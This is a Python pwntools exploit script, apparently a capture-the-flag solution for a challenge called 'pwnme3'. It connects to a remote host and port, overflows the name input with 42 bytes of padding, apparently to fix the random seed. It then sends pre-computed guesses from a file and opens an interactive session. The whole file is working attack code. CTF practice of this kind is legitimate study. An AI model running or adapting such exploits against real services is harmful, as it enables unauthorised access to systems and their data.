#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048968'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

shellcode="/home/flag"
#  print disasm(shellcode)

offset = 0x2a

#io = process('/home/h11p/hackme/pwnme3')

io = remote('104.224.169.128', 18885)

payload ="a"*42

#debug()
io.recvuntil('Are you sure want to play the game?\n')
io.sendline('1')
io.recvuntil('Input your name :')
io.sendline(payload)
with open('rand.txt','r') as file:
    for line in file:
        io.recvuntil('Init random seed OK. Now guess :')
        io.sendline(line)
#io.sendline(shellcode)

io.interactive()
#resp = io.recvn(4)
#myread = u32(resp)
#print myread
io.close()

